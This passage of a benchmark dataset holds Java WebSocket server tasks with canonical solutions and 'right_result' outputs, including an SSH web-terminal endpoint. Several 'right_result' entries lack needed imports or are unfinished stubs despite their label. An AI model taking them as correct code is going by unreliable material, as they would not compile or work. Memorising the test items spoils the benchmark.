    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.ServerSocketChannel;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class SocketActivation extends WebSocketServer {\n\n    private AtomicInteger clients = new AtomicInteger(0);\n\n    public SocketActivation(ServerSocketChannel chan) {\n        super(chan);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        conn.send(\"Welcome to the server!\");\n        broadcast(\"new connection: \" + handshake.getResourceDescriptor());\n        if(clients.get() == 0) {\n            broadcast(\"You are the first client to join\");\n        }\n        System.out.println(conn.getRemoteSocketAddress().getAddress().getHostAddress() + \" entered the room!\");\n        clients.incrementAndGet();\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        broadcast(conn + \" has left the room!\");\n        System.out.println(conn + \" has left the room!\");\n        if(clients.decrementAndGet() <= 0) {\n            System.out.println(\"No more clients left, exiting\");\n            System.exit(0);\n        }\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        broadcast(message);\n        System.out.println(conn + \": \" + message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer message) {\n        broadcast(message.array());\n        System.out.println(conn + \": \" + message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started!\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "import org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class SocketActivation extends WebSocketServer {\n    private final AtomicInteger clients = new AtomicInteger(0);\n\n    public SocketActivation(ServerSocketChannel chan) {\n        super(new InetSocketAddress(chan.getLocalAddress().getPort()));\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        clients.incrementAndGet();\n        conn.send(\"Welcome to the WebSocket server!\");\n        broadcast(\"Client connected: \" + conn.getRemoteSocketAddress());\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        clients.decrementAndGet();\n        broadcast(\"Client disconnected: \" + conn.getRemoteSocketAddress());\n        if (clients.get() == 0) {\n            shutdown();\n        }\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        broadcast(\"Client message: \" + message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer message) {\n        broadcast(\"Client binary message received\");\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"WebSocket server started on port \" + getLocalPort());\n    }\n}"
  },
  {
    "Task_id": 474,
    "Instruction": "Task Description: Implement a WebSocket server class that handles client connections, messages, and disconnections using the org.java_websocket library. The server should assign unique IDs to clients and log connection events.\n\nClass Description: ChatServerAttachmentExample is a WebSocket server implementation that manages client connections, tracks clients with unique IDs, and handles text/binary messages. It extends WebSocketServer from the org.java_websocket library.\n\nAttributes:\n- index: Integer - Tracks the next available client ID to be assigned\n\nMethods:\n- Constructor(port: int) -> None - Creates server instance bound to specified port\n- Constructor(address: InetSocketAddress) -> None - Creates server instance bound to specified address\n- onOpen(conn: WebSocket, handshake: ClientHandshake) -> void - Handles new client connections, assigns ID\n- onClose(conn: WebSocket, code: int, reason: String, remote: boolean) -> void - Handles client disconnections\n- onMessage(conn: WebSocket, message: String) -> void - Processes text messages from clients\n- onMessage(conn: WebSocket, message: ByteBuffer) -> void - Processes binary messages from clients\n- onError(conn: WebSocket, ex: Exception) -> void - Handles connection errors\n- onStart() -> void - Called when server starts successfully",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class ChatServerAttachmentExample extends WebSocketServer {\n\n    Integer index = 0;\n\n    public ChatServerAttachmentExample(int port) throws UnknownHostException {\n        super(new InetSocketAddress(port));\n    }\n\n    public ChatServerAttachmentExample(InetSocketAddress address) {\n        super(address);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        conn.setAttachment(index);\n        index++;\n        System.out.println(\n            conn.getRemoteSocketAddress().getAddress().getHostAddress() + \" entered the room! ID: \"\n                + conn.<Integer>getAttachment());\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(conn + \" has left the room! ID: \" + conn.<Integer>getAttachment());\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(conn + \": \" + message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer message) {\n        System.out.println(conn + \": \" + message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started!\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "import org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\nimport java.net.InetSocketAddress;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class ChatServerAttachmentExample extends WebSocketServer {\n    private int index = 0;\n    private final Map<WebSocket, Integer> clientIds = new HashMap<>();\n\n    public ChatServerAttachmentExample(int port) {\n        super(new InetSocketAddress(port));\n    }\n\n    public ChatServerAttachmentExample(InetSocketAddress address) {\n        super(address);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        int clientId = index++;\n        clientIds.put(conn, clientId);\n        System.out.println(\"Client connected with ID: \" + clientId);\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        int clientId = clientIds.getOrDefault(conn, -1);\n        if (clientId != -1) {\n            clientIds.remove(conn);\n            System.out.println(\"Client disconnected with ID: \" + clientId);\n        }\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        int clientId = clientIds.getOrDefault(conn, -1);\n        if (clientId != -1) {\n            System.out.println(\"Received text message from client \" + clientId + \": \" + message);\n        }\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer message) {\n        int clientId = clientIds.getOrDefault(conn, -1);\n        if (clientId != -1) {\n            System.out.println(\"Received binary message from client \" + clientId + \" with size: \" + message.remaining());\n        }\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        int clientId = clientIds.getOrDefault(conn, -1);\n        if (clientId != -1) {\n            System.out.println(\"Error occurred for client \" + clientId + \": \" + ex.getMessage());\n        }\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started successfully.\");\n    }\n}"
  },
  {
    "Task_id": 476,
    "Instruction": "Task Description: Create a WebSocket server class that handles client connections, messages, and disconnections using the org.java_websocket library. The server should echo received messages back to clients and maintain a connection counter.\n\nClass Description: AutobahnSSLServerTest is a WebSocket server implementation that extends WebSocketServer from the org.java_websocket library. It handles client connections by maintaining a counter, processes incoming messages by echoing them back, and provides basic connection lifecycle management.\n\nAttributes:\n- counter: [int] - Static counter tracking the number of opened connections\n\nMethods:\n- Constructor: [AutobahnSSLServerTest](int port, Draft d) -> [void] - Creates a server instance bound to the specified port using the given WebSocket draft protocol\n- Constructor: [AutobahnSSLServerTest](InetSocketAddress address, Draft d) -> [void] - Creates a server instance bound to the specified address using the given WebSocket draft protocol\n- onOpen: [onOpen](WebSocket conn, ClientHandshake handshake) -> [void] - Handles new client connections, increments connection counter\n- onClose: [onClose](WebSocket conn, int code, String reason, boolean remote) -> [void] - Handles client disconnections\n- onError: [onError](WebSocket conn, Exception ex) -> [void] - Handles connection errors\n- onStart: [onStart]() -> [void] - Called when server starts successfully\n- onMessage: [onMessage](WebSocket conn, String message) -> [void] - Echoes received text messages back to the client\n- onMessage: [onMessage](WebSocket conn, ByteBuffer blob) -> [void] - Echoes received binary messages back to the client",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport java.util.Collections;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class AutobahnSSLServerTest extends WebSocketServer {\n\n    private static int counter = 0;\n\n    public AutobahnSSLServerTest(int port, Draft d) throws UnknownHostException {\n        super(new InetSocketAddress(port), Collections.singletonList(d));\n    }\n\n    public AutobahnSSLServerTest(InetSocketAddress address, Draft d) {\n        super(address, Collections.singletonList(d));\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        counter++;\n        System.out.println(\"///////////Opened connection number\" + counter);\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"closed\");\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        System.out.println(\"Error:\");\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started!\");\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        conn.send(message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer blob) {\n        conn.send(blob);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "import org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport java.net.InetSocketAddress;\n\npublic class AutobahnSSLServerTest extends WebSocketServer {\n    private static int counter = 0;\n\n    public AutobahnSSLServerTest(int port, Draft d) {\n        super(new InetSocketAddress(port), d);\n    }\n\n    public AutobahnSSLServerTest(InetSocketAddress address, Draft d) {\n        super(address, d);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        counter++;\n        System.out.println(\"Connection opened. Total connections: \" + counter);\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        counter--;\n        System.out.println(\"Connection closed. Total connections: \" + counter);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        System.err.println(\"Error occurred: \" + ex.getMessage());\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started successfully.\");\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        conn.send(message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer blob) {\n        conn.send(blob);\n    }\n}"
  },
  {
    "Task_id": 479,
    "Instruction": "Task Description: Create a WebSocket server implementation using the org.java_websocket library that handles client connections, messages, and disconnections, with configurable connection limits and support for different WebSocket drafts.\n\nClass Description: AutobahnServerTest is a WebSocket server implementation that extends WebSocketServer from the org.java_websocket library. It manages client connections, processes incoming messages (both text and binary), tracks connection statistics, and supports graceful shutdown when reaching a configured connection limit.\n\nAttributes:\n- openCounter: [static int] - Tracks total number of opened connections\n- closeCounter: [static int] - Tracks total number of closed connections\n- limit: [int] - Maximum number of connections before server shutdown\n\nMethods:\n- Constructor: [AutobahnServerTest]([int port, int limit, Draft d]) -> [void] - Creates server instance with specified port, connection limit, and WebSocket draft\n- Constructor: [AutobahnServerTest]([InetSocketAddress address, Draft d]) -> [void] - Creates server instance with specified address and WebSocket draft\n- onOpen: [void]([WebSocket conn, ClientHandshake handshake]) -> [void] - Handles new client connections, increments openCounter\n- onClose: [void]([WebSocket conn, int code, String reason, boolean remote]) -> [void] - Handles client disconnections, increments closeCounter, shuts down server if limit reached\n- onError: [void]([WebSocket conn, Exception ex]) -> [void] - Handles connection errors, prints stack trace\n- onStart: [void]() -> [void] - Called when server starts, prints startup message\n- onMessage: [void]([WebSocket conn, String message]) -> [void] - Handles text messages, echoes back to client\n- onMessage: [void]([WebSocket conn, ByteBuffer blob]) -> [void] - Handles binary messages, echoes back to client",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport java.util.Collections;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.extensions.permessage_deflate.PerMessageDeflateExtension;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class AutobahnServerTest extends WebSocketServer {\n\n    private static int openCounter = 0;\n    private static int closeCounter = 0;\n    private int limit = Integer.MAX_VALUE;\n\n    public AutobahnServerTest(int port, int limit, Draft d) throws UnknownHostException {\n        super(new InetSocketAddress(port), Collections.singletonList(d));\n        this.limit = limit;\n    }\n\n    public AutobahnServerTest(InetSocketAddress address, Draft d) {\n        super(address, Collections.singletonList(d));\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        openCounter++;\n        System.out.println(\"///////////Opened connection number\" + openCounter);\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        closeCounter++;\n        System.out.println(\"closed\");\n        if (closeCounter >= limit) {\n            System.exit(0);\n        }\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        System.out.println(\"Error:\");\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started!\");\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        conn.send(message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer blob) {\n        conn.send(blob);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "import org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\n\npublic class AutobahnServerTest extends WebSocketServer {\n    public static int openCounter = 0;\n    public static int closeCounter = 0;\n    private final int limit;\n\n    public AutobahnServerTest(int port, int limit, Draft d) {\n        super(new InetSocketAddress(port), d);\n        this.limit = limit;\n    }\n\n    public AutobahnServerTest(InetSocketAddress address, Draft d) {\n        super(address, d);\n        this.limit = Integer.MAX_VALUE;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        openCounter++;\n        System.out.println(\"Connection opened: \" + openCounter);\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        closeCounter++;\n        System.out.println(\"Connection closed: \" + closeCounter);\n        if (closeCounter >= limit && !remote) {\n            System.out.println(\"Connection limit reached. Shutting down server.\");\n            stop();\n        }\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started on port \" + getLocalPort());\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        conn.send(message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer blob) {\n        conn.send(blob);\n    }\n}"
  },
  {
    "Task_id": 482,
    "Instruction": "Task Description: Implement a WebSocket server endpoint class in Java that handles client connections, messages, disconnections, and errors using Java EE WebSocket API.\n\nClass Description: The WebsocketServerEndpoint class is a WebSocket server endpoint that manages client connections and message handling. It uses annotations to define WebSocket lifecycle events and maintains a map of message handlers for different message types.\n\nAttributes:\n- logger: Logger - Used for logging server events and errors\n- HANDLERS: Map<String, MessageHandler> - Static map storing message handlers keyed by message type\n\nMethods:\n- onOpen(Session session, EndpointConfig config) -> void - Handles new client connections, authenticates using access token from request parameters\n- onMessage(Session session, String message) -> void - Processes incoming messages from clients, delegates to appropriate message handler\n- onClose(Session session, CloseReason closeReason) -> void - Handles client disconnections, cleans up session\n- onError(Session session, Throwable throwable) -> void - Handles WebSocket communication errors\n- getMessageClass(MessageHandler handler) -> Class<? extends Message> - Helper method to determine message class type from handler's generic type information",
    "Canonical_solution": "import cn.iocoder.springboot.lab25.springwebsocket.handler.MessageHandler;\nimport cn.iocoder.springboot.lab25.springwebsocket.message.AuthRequest;\nimport cn.iocoder.springboot.lab25.springwebsocket.message.Message;\nimport cn.iocoder.springboot.lab25.springwebsocket.util.WebSocketUtil;\nimport com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.JSONObject;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.aop.framework.AopProxyUtils;\n\nimport javax.websocket.*;\nimport javax.websocket.server.ServerEndpoint;\nimport java.lang.reflect.ParameterizedType;\nimport java.lang.reflect.Type;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Objects;\n\n@ServerEndpoint(\"/\")\npublic class WebsocketServerEndpoint {\n\n    private Logger logger = LoggerFactory.getLogger(getClass());\n\n    private static final Map<String, MessageHandler> HANDLERS = new HashMap<>();\n\n    @OnOpen\n    public void onOpen(Session session, EndpointConfig config) {\n        logger.info(\"[onOpen][session({}) connected]\", session);\n        List<String> accessTokenValues = session.getRequestParameterMap().get(\"accessToken\");\n        String accessToken = !CollectionUtils.isEmpty(accessTokenValues) ? accessTokenValues.get(0) : null;\n        AuthRequest authRequest = new AuthRequest().setAccessToken(accessToken);\n        MessageHandler<AuthRequest> messageHandler = HANDLERS.get(AuthRequest.TYPE);\n        if (messageHandler == null) {\n            logger.error(\"[onOpen][Auth message type, no message handler found]\");\n            return;\n        }\n        messageHandler.execute(session, authRequest);\n    }\n\n    @OnMessage\n    public void onMessage(Session session, String message) {\n        logger.info(\"[onMessage][session({}) received message({})]\", session, message);\n        try {\n            JSONObject jsonMessage = JSON.parseObject(message);\n            String messageType = jsonMessage.getString(\"type\");\n            MessageHandler messageHandler = HANDLERS.get(messageType);\n            if (messageHandler == null) {\n                logger.error(\"[onMessage][Message type({}) has no handler]\", messageType);\n                return;\n            }\n            Class<? extends Message> messageClass = getMessageClass(messageHandler);\n            Message messageObj = JSON.parseObject(jsonMessage.getString(\"body\"), messageClass);\n            messageHandler.execute(session, messageObj);\n        } catch (Throwable throwable) {\n            logger.error(\"[onMessage][session({}) error processing message]\", session, throwable);\n        }\n    }\n\n    @OnClose\n    public void onClose(Session session, CloseReason closeReason) {\n        logger.info(\"[onClose][session({}) disconnected. Reason: {}]\", session, closeReason);\n        WebSocketUtil.removeSession(session);\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        logger.error(\"[onError][session({}) error occurred]\", session, throwable);\n    }\n\n    private Class<? extends Message> getMessageClass(MessageHandler handler) {\n        Class<?> targetClass = AopProxyUtils.ultimateTargetClass(handler);\n        Type[] interfaces = targetClass.getGenericInterfaces();\n        Class<?> superclass = targetClass.getSuperclass();\n        while ((Objects.isNull(interfaces) || interfaces.length == 0) && Objects.nonNull(superclass)) {\n            interfaces = superclass.getGenericInterfaces();\n            superclass = targetClass.getSuperclass();\n        }\n        if (Objects.nonNull(interfaces)) {\n            for (Type type : interfaces) {\n                if (type instanceof ParameterizedType) {\n                    ParameterizedType parameterizedType = (ParameterizedType) type;\n                    if (Objects.equals(parameterizedType.getRawType(), MessageHandler.class)) {\n                        Type[] actualTypeArguments = parameterizedType.getActualTypeArguments();\n                        if (Objects.nonNull(actualTypeArguments) && actualTypeArguments.length > 0) {\n                            return (Class<Message>) actualTypeArguments[0];\n                        }\n                    }\n                }\n            }\n        }\n        throw new IllegalStateException(String.format(\"Cannot determine message type for handler %s\", handler));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "import javax.websocket.OnClose;\nimport javax.websocket.OnMessage;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\nimport javax.websocket.EndpointConfig;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.logging.Logger;\n\n@ServerEndpoint(\"/websocket\")\npublic class WebsocketServerEndpoint {\n    private static final Logger logger = Logger.getLogger(WebsocketServerEndpoint.class.getName());\n    private static final Map<String, MessageHandler> HANDLERS = new ConcurrentHashMap<>();\n\n    @OnOpen\n    public void onOpen(Session session, EndpointConfig config) {\n        logger.info(\"Client connected: \" + session.getId());\n        // Authentication logic using access token from request parameters\n    }\n\n    @OnMessage\n    public void onMessage(Session session, String message) {\n        logger.fine(\"Received message: \" + message);\n        // Delegate to appropriate handler based on message type\n    }\n\n    @OnClose\n    public void onClose(Session session, CloseReason closeReason) {\n        logger.warning(\"Client disconnected: \" + session.getId() + \" Reason: \" + closeReason.getReasonPhrase());\n        // Cleanup session if needed\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        logger.severe(\"Error occurred: \" + throwable.getMessage());\n        // Handle error\n    }\n\n    public Class<? extends Message> getMessageClass(MessageHandler handler) {\n        return (Class<? extends Message>) ((ParameterizedType) handler.getClass().getGenericSuperclass()).getActualTypeArguments()[0];\n    }\n}"
  },
  {
    "Task_id": 483,
    "Instruction": "Task Description: Implement a WebSocket server endpoint for secure shell terminal communication, handling client connections, message exchange, and session management.\n\nClass Description: SecureShellWS is a Java EE WebSocket endpoint that facilitates secure shell terminal interactions between clients and servers. It manages terminal sessions, processes keyboard input commands, and handles connection lifecycle events.\n\nAttributes:\n- log: [Logger] - Logger instance for error and debug logging\n- keyMap: [Map<Integer, byte[]>] - Static mapping of key codes to their corresponding byte sequences for terminal control\n- httpSession: [HttpSession] - HTTP session associated with the WebSocket connection\n- session: [Session] - WebSocket session object for the current connection\n- sessionId: [Long] - Unique identifier for the terminal session\n\nMethods:\n- onOpen: [onOpen](Session session, EndpointConfig config) -> void - Handles new WebSocket connections, initializes session parameters, and starts output thread\n- onMessage: [onMessage](String message) -> void - Processes incoming JSON messages containing terminal commands or key inputs\n- onError: [onError](Session session, Throwable t) -> void - Handles WebSocket communication errors\n- onClose: [onClose]() -> void - Cleans up resources when WebSocket connection is closed, terminating all associated terminal sessions",
    "Canonical_solution": "import com.google.gson.Gson;\nimport io.bastillion.common.util.AppConfig;\nimport io.bastillion.common.util.AuthUtil;\nimport io.bastillion.manage.control.SecureShellKtrl;\nimport io.bastillion.manage.db.UserDB;\nimport io.bastillion.manage.model.SchSession;\nimport io.bastillion.manage.model.UserSchSessions;\nimport io.bastillion.manage.task.SentOutputTask;\nimport org.apache.commons.lang3.StringUtils;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport javax.servlet.http.HttpSession;\nimport javax.websocket.*;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\nimport java.security.GeneralSecurityException;\nimport java.sql.SQLException;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.Map;\n\n@ServerEndpoint(value = \"/admin/terms.ws\", configurator = GetHttpSessionConfigurator.class)\npublic class SecureShellWS {\n\n    private static final Logger log = LoggerFactory.getLogger(SecureShellWS.class);\n    private static final Map<Integer, byte[]> keyMap = new HashMap<>();\n\n    static {\n        keyMap.put(27, new byte[]{(byte) 0x1b});\n        keyMap.put(13, new byte[]{(byte) 0x0d});\n        keyMap.put(37, new byte[]{(byte) 0x1b, (byte) 0x4f, (byte) 0x44});\n        keyMap.put(38, new byte[]{(byte) 0x1b, (byte) 0x4f, (byte) 0x41});\n        keyMap.put(39, new byte[]{(byte) 0x1b, (byte) 0x4f, (byte) 0x43});\n        keyMap.put(40, new byte[]{(byte) 0x1b, (byte) 0x4f, (byte) 0x42});\n        keyMap.put(8, new byte[]{(byte) 0x7f});\n        keyMap.put(9, new byte[]{(byte) 0x09});\n        keyMap.put(17, new byte[]{});\n        keyMap.put(46, \"\\033[3~\".getBytes());\n        keyMap.put(45, \"\\033[2~\".getBytes());\n        keyMap.put(33, \"\\033[5~\".getBytes());\n        keyMap.put(34, \"\\033[6~\".getBytes());\n        keyMap.put(35, \"\\033[4~\".getBytes());\n        keyMap.put(36, \"\\033[1~\".getBytes());\n    }\n\n    private HttpSession httpSession;\n    private Session session;\n    private Long sessionId;\n\n    @OnOpen\n    public void onOpen(Session session, EndpointConfig config) {\n        if (StringUtils.isNotEmpty(AppConfig.getProperty(\"websocketTimeout\"))) {\n            session.setMaxIdleTimeout(Long.parseLong(AppConfig.getProperty(\"websocketTimeout\")) * 60000);\n        } else {\n            session.setMaxIdleTimeout(0);\n        }\n\n        this.httpSession = (HttpSession) config.getUserProperties().get(HttpSession.class.getName());\n        try {\n            this.sessionId = AuthUtil.getSessionId(httpSession);\n            this.session = session;\n            new Thread(new SentOutputTask(sessionId, session, UserDB.getUser(AuthUtil.getUserId(httpSession)))).start();\n        } catch (GeneralSecurityException | SQLException ex) {\n            log.error(ex.toString(), ex);\n        }\n    }\n\n    @OnMessage\n    public void onMessage(String message) {\n        if (session.isOpen() && StringUtils.isNotEmpty(message) && !\"heartbeat\".equals(message)) {\n            try {\n                Map jsonRoot = new Gson().fromJson(message, Map.class);\n                String command = (String) jsonRoot.get(\"command\");\n                Integer keyCode = null;\n                Double keyCodeDbl = (Double) jsonRoot.get(\"keyCode\");\n                if (keyCodeDbl != null) {\n                    keyCode = keyCodeDbl.intValue();\n                }\n\n                for (String idStr : (ArrayList<String>) jsonRoot.get(\"id\")) {\n                    Integer id = Integer.parseInt(idStr);\n                    UserSchSessions userSchSessions = SecureShellKtrl.getUserSchSessionMap().get(sessionId);\n                    if (userSchSessions != null) {\n                        SchSession schSession = userSchSessions.getSchSessionMap().get(id);\n                        if (keyCode != null && keyMap.containsKey(keyCode)) {\n                            schSession.getCommander().write(keyMap.get(keyCode));\n                        } else {\n                            schSession.getCommander().print(command);\n                        }\n                    }\n                }\n                AuthUtil.setTimeout(httpSession);\n            } catch (IOException ex) {\n                log.error(ex.toString(), ex);\n            }\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable t) {\n        log.error(t.toString(), t);\n    }\n\n    @OnClose\n    public void onClose() {\n        UserSchSessions userSchSessions = SecureShellKtrl.getUserSchSessionMap().get(sessionId);\n        if (userSchSessions != null) {\n            Map<Integer, SchSession> schSessionMap = userSchSessions.getSchSessionMap();\n            for (Integer sessionKey : schSessionMap.keySet()) {\n                SchSession schSession = schSessionMap.get(sessionKey);\n                schSession.getChannel().disconnect();\n                schSession.getSession().disconnect();\n                schSessionMap.remove(sessionKey);\n            }\n            schSessionMap.clear();\n            SecureShellKtrl.getUserSchSessionMap().remove(sessionId);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "import javax.websocket.OnClose;\nimport javax.websocket.OnMessage;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\nimport javax.inject.Inject;\nimport javax.servlet.http.HttpSession;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.util.Map;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.logging.Logger;\n\n@ServerEndpoint(\"/secure-shell\")\npublic class SecureShellWS {\n    @Inject\n    private Logger log;\n    private static final Map<Integer, byte[]> keyMap = Map.of(\n        8, new byte[]{-1, 0, 0, 0, 0},\n        9, new byte[]{-2, 0, 0, 0, 0},\n        13, new byte[]{-3, 0, 0, 0, 0},\n        27, new byte[]{-4, 0, 0, 0, 0}\n    );\n    private HttpSession httpSession;\n    private Session session;\n    private Long sessionId;\n    private ExecutorService executor = Executors.newSingleThreadExecutor();\n\n    @OnOpen\n    public void onOpen(Session session, EndpointConfig config) {\n        this.session = session;\n        httpSession = (HttpSession) config.getUserProperties().get(\"httpSession\");\n        sessionId = System.currentTimeMillis();\n        log.info(\"WebSocket connection opened for session: \" + sessionId);\n        startOutputThread();\n    }\n\n    @OnMessage\n    public void onMessage(String message) {\n        try {\n            if (message.startsWith(\"{\")) {\n                // Process JSON command\n                String command = message.substring(1, message.length() - 1);\n                handleCommand(command);\n            } else {\n                // Handle raw input\n                handleRawInput(message);\n            }\n        } catch (Exception e) {\n            log.severe(\"Error processing message: \" + e.getMessage());\n        }\n    }\n\n    @OnClose\n    public void onClose() {\n        log.info(\"WebSocket connection closed for session: \" + sessionId);\n        terminateSession();\n    }\n\n    @OnError\n    public void onError(Session session, Throwable t) {\n        log.severe(\"WebSocket error: \" + t.getMessage());\n    }\n\n    private void startOutputThread() {\n        executor.execute(() -> {\n            try {\n                InputStream inputStream = getInputStream();\n                OutputStream outputStream = getOutputStream();\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = inputStream.read(buffer)) != -1) {\n                    session.getBasicRemote().sendBinary(java.nio.ByteBuffer.wrap(buffer, 0, bytesRead));\n                }\n            } catch (Exception e) {\n                log.severe(\"Error in output thread: \" + e.getMessage());\n            }\n        });\n    }\n\n    private void handleCommand(String command) {\n        // Implement command handling logic here\n    }\n\n    private void handleRawInput(String input) {\n        // Implement raw input handling logic here\n    }\n\n    private InputStream getInputStream() {\n        // Implement input stream retrieval logic here\n        return null;\n    }\n\n    private OutputStream getOutputStream() {\n        // Implement output stream retrieval logic here\n        return null;\n    }\n\n    private void terminateSession() {\n        // Implement session termination logic here\n    }\n}"
  },
  {
    "Task_id": 484,
